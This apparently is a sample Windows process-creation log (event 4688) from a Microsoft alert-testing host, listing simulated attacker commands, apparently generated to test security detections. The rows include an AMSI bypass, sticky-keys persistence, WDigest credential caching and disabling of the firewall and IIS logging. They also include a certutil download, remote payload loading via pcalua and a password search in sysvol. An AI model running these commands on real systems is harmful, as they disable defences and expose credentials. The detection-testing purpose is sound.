52,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.233,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x142c,C:\Windows\System32\whoami.exe,%%1936,0xbc8,whoami,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.233,sibling,1,,
53,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.283,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14b0,C:\Windows\System32\HOSTNAME.EXE,%%1936,0xbc8,hostname,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.283,sibling,1,,
54,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.317,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14c0,C:\Windows\System32\NETSTAT.EXE,%%1936,0xbc8,netstat  -an,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.317,sibling,1,,
55,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.440,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14fc,C:\Windows\System32\net.exe,%%1936,0xbc8,net  user Bob1 /domain,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.440,sibling,1,,
56,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.483,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14e8,C:\Windows\System32\net.exe,%%1936,0xbc8,net  user BobX /domain,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.483,sibling,1,,
57,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.520,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1520,C:\Windows\System32\net.exe,%%1936,0xbc8,"net  group ""Domain Admins"" /domain",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.520,sibling,1,,
58,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.553,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1550,C:\Diagnostics\UserTmp\rundll32.exe,%%1936,0xbc8,.\rUnDlL32  /C ShEll32Control_RanDLL.dll,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.553,sibling,1,,
59,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.570,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1560,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,.\reg  query add mscfile\\\\open,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.570,sibling,1,,
60,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.620,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1584,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,.\reg  add Image File Execution Options sethc.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.620,sibling,1,,
61,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.727,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15c0,C:\Diagnostics\UserTmp\dubrute.exe,%%1936,0xbc8,.\dubrute.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.727,sibling,1,,
62,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.777,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1600,C:\Diagnostics\UserTmp\nlbrute.exe,%%1936,0xbc8,.\nlbrute.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.777,sibling,1,,
63,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.827,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15f0,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,".\reg  add ""HKLM\system\CurrentControlSet\Control\Terminal Server"" /v ""fDenyTSConnections"" /t REG_DWORD /d 0x1 /f",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.827,sibling,1,,
64,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.880,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x162c,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,".\reg  add ""HKLM\system\CurrentControlSet\Control\Terminal Server"" /v ""fDenyTSConnections"" /t REG_DWORD /d 0x0 /f",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.880,sibling,1,,
65,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.923,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x166c,C:\Windows\System32\net.exe,%%1936,0xbc8,net  use v: \\tsclient\c,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.923,sibling,1,,
66,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:15.950,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1660,C:\Windows\System32\net.exe,%%1936,0xbc8,net  v: /delete,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:15.950,sibling,1,,
67,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.020,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x169c,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c C:\Windows\System32\mshta.exe vbscript:CreateObject(""Wscript.Shell"").Run("".\powershell.exe -c """"$x=$((gp HKLM:Software\Microsoft\Windows\CurrentVersion Certificate).Certificate);.\powershell -E $y"""""",0,True)(window.close)",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.020,sibling,1,,
68,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.067,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x168c,C:\Diagnostics\UserTmp\netsh.exe,%%1936,0xbc8,.\netsh  advfirewall firewall add rule name=RbtGskQ action=allow program=c:\users\Bob\appdata\Roaming\RbtGskQ\RbtGskQ.exe,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.067,sibling,1,,
69,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:16.117,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x16c8,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,.\reg  add HKLM\KEY_LOCAL_MACHINE\...securityproviders\wdigest uselogoncredential /t 1,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:16.117,sibling,1,,
70,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.220,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x158c,C:\Windows\System32\cmd.exe,%%1936,0xbc8,c:\Windows\System32\cmd.exe  /c net user,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.220,sibling,1,,
71,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.363,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15c8,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c c:\Diagnostics\UserTmp\scrsave.scr""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.363,sibling,1,,
72,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.410,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15ec,C:\Diagnostics\UserTmp\svchost.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\svchost.exe ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.410,sibling,1,,
73,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.457,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15e8,C:\Diagnostics\UserTmp\smss.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\smss.exe ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.457,sibling,1,,
74,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.493,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1630,C:\Windows\System32\svchost.exe,%%1936,0xbc8,c:\Windows\System32\svchost.exe  -k malicious,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.493,sibling,1,,
75,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.520,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1668,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd.exe  /c echo createobject""msxml2.xmlhttp"") ",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.520,sibling,1,,
76,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.570,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1658,C:\Diagnostics\UserTmp\ASC_Alerttest_662jfi039n.exe,%%1936,0xbc8,ASC_Alerttest_662jfi039n.exe  -foo,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.570,sibling,1,,
77,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.580,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1664,C:\Diagnostics\UserTmp\powershell.exe,%%1936,0xbc8,".\powershell.exe   -command [ref].assembly.gettype('http://system.management.automation.amsiutils').getfield('amsiinitfailed','nonpublic,static').setvalue($null,$true)\""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.580,sibling,1,,
78,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:17.650,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x16d4,C:\Diagnostics\UserTmp\netsh.exe,%%1936,0xbc8,netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\Users\\user\\AppData\\Local\\Temp\\bzzzzzz.txt,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:17.650,sibling,1,,
79,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.080,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x16c0,C:\Diagnostics\UserTmp\wuauclt.exe,%%1936,0xbc8,".\wuauclt.exe  /C ""c:\windows\softwaredistribution\cscript.exe""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.080,sibling,1,,
80,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.287,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x16f4,C:\Diagnostics\UserTmp\lsass.exe,%%1936,0xbc8,".\lsass.exe  /C ""c:\windows\softwaredistribution\cscript.exe""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.287,sibling,1,,
81,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.337,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1728,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""powershell wscript.shell used to download a .gif""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.337,sibling,1,,
82,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.403,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1798,C:\Diagnostics\UserTmp\cacls.exe,%%1936,0xbc8,cacls.exe  c:\windows\system32\wscript.exe /e /t /g everyone:f,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.403,sibling,1,,
83,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.450,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1758,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c ""cd /d ""C:\inetpub\wwwroot""&c:\windows\system32\inetsrv\appcmd set config ""Default Web Site/"" /section:httplogging /dontLog:true&echo [S]&cd&echo [E]""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.450,sibling,1,,
84,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.500,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x17a8,C:\Diagnostics\UserTmp\2840.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\2840.exe ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.500,sibling,1,,
85,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.547,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x17f8,C:\Diagnostics\UserTmp\a_keygen.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\a_keygen.exe ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.547,sibling,1,,
86,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.553,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x17cc,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,"cmd  /c echo "" SYSTEMINFO && SYSTEMINFO && DEL """,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.553,sibling,1,,
87,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.630,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1414,C:\Diagnostics\UserTmp\bittorrent.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\bittorrent.exe ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.630,sibling,1,,
88,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.670,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x28c,C:\Diagnostics\UserTmp\netsh.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\netsh.exe   firewall set opmode mode=disable profile=all,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.670,sibling,1,,
89,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.707,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0xc18,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,cmd  /c echo rundll32.exe perfc.dat,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.707,sibling,1,,
90,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.770,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1404,C:\Diagnostics\UserTmp\ransomware.exe,%%1936,0xbc8,c:\Diagnostics\UserTmp\ransomware.exe   @ abc.com abc.wallet,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.770,sibling,1,,
91,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.820,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x147c,C:\Diagnostics\UserTmp\cmd.exe,%%1936,0xbc8,cmd  /c echo /e:vbscript.encode /b,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.820,sibling,1,,
92,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.867,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1464,C:\Diagnostics\UserTmp\pcalua.exe,%%1936,0xbc8,pcalua.exe  -a \\server\payload.dll,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.867,sibling,1,,
93,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.917,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14b8,C:\Diagnostics\UserTmp\findstr.exe,%%1936,0xbc8,findstr  /si password sysvol *.txt,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.917,sibling,1,,
94,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:18.967,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14ec,C:\Diagnostics\UserTmp\odbcconf.exe,%%1936,0xbc8,odbcconf.exe  /S /A {REGSVR C:\Users\Administrator\AppData\Roaming\{RANDOM}.txt,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:18.967,sibling,1,,
95,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.010,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14f0,C:\Diagnostics\UserTmp\odbcconf.exe,%%1936,0xbc8,odbcconf.exe  /f my.rspáá,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.010,sibling,1,,
96,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.060,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x14e8,C:\Diagnostics\UserTmp\SQLDumper.exe,%%1936,0xbc8,sqldumper.exe  464 0 0x0110:40,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.060,sibling,1,,
97,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.127,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1564,C:\Diagnostics\UserTmp\mt.exe,%%1936,0xbc8,mt.exe  port,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.127,sibling,1,,
98,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.180,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x155c,C:\Diagnostics\UserTmp\mt.exe,%%1936,0xbc8,mt.exe  smb,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.180,sibling,1,,
99,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.223,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15b8,C:\Diagnostics\UserTmp\hd.exe,%%1936,0xbc8,hd.exe  -pslist,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.223,sibling,1,,
100,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.337,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x15d0,C:\Diagnostics\UserTmp\hd.exe,%%1936,0xbc8,hd.exe  -enum,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.337,sibling,1,,
101,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.403,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x158c,C:\Diagnostics\UserTmp\netsh.exe,%%1936,0xbc8,netsh.exe  PortOpenning,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.403,sibling,1,,
102,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.447,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1638,C:\Diagnostics\UserTmp\certutil.exe,%%1936,0xbc8,certutil  -urlcache -split -f http://127.0.0.1/ ,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.447,sibling,1,,
103,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.490,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1624,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,".\reg  add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\MyNastySvcHostConfig""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.490,sibling,1,,
104,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.537,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1628,C:\Diagnostics\UserTmp\reg.exe,%%1936,0xbc8,".\reg  delete ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\MyNastySvcHostConfig""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.537,sibling,1,,
105,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.583,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x1654,C:\Windows\System32\sc.exe,%%1936,0xbc8,"sc  create MSTICTestService binPath=C:\Users\MSTICA~1\AppData\Local\Temp\hd.exe DisplayName=""Test Service""",C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.583,sibling,1,,
106,802d39e1-9d70-404d-832c-2de5e2478eda,MSTICAlertsWin1\MSTICAdmin,4688,2019-01-15 05:15:19.617,MSTICAlertsWin1,S-1-5-21-996632719-2361334927-4038480536-500,MSTICAdmin,MSTICAlertsWin1,0xfaac27,0x169c,C:\Windows\System32\sc.exe,%%1936,0xbc8,sc  delete MSTICTestService,C:\Windows\System32\cmd.exe,0x0,46fe7078-61bb-4bed-9430-7ac01d91c273,2019-01-15 05:15:19.617,sibling,1,,
